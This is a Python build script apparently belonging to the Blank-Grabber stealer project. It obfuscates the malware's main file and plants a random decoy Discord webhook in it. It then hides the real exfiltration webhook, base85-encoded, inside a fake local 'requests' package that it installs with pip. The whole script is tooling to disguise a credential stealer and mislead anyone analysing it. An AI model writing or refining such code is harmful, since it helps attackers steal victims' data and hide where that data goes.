import base64, codecs, string, random, subprocess
with open("main.py", encoding="utf-8") as file:
    fakewebhook = f"https://discord.com/api/webhooks/{''.join(random.choices(string.digits, k= 18))}/{''.join(random.choices(string.ascii_letters + string.digits, k= 68))}"
    code = file.readlines()
for i, j in enumerate(code):
    if "faxxhookxxx" in j: #Flag for finding webhook declaration line
        code[i] = f'WEBHOOK = "{base64.b85encode(fakewebhook.encode()).decode()}"'

code = "\n".join(code)

with open("main-o.py", "w", encoding="utf-8") as file:
    file.write(code)

with open("webhook.txt") as webhook:
    hook = webhook.read()
subprocess.run("python obf.py -o main-o.py main-o.py", shell= True, capture_output= True)

with open("./fake-module/requests/__init__.py", "w", encoding= "utf-8") as file:
    file.write(f'__author__ = "Blank-c"\n__github__ = "https://github.com/Blank-c/Blank-Grabber"\nWEBHOOK = "{base64.b85encode(hook.encode()).decode()}"')

subprocess.run("pip install -e .", shell= True, capture_output= True, cwd= "./fake-module")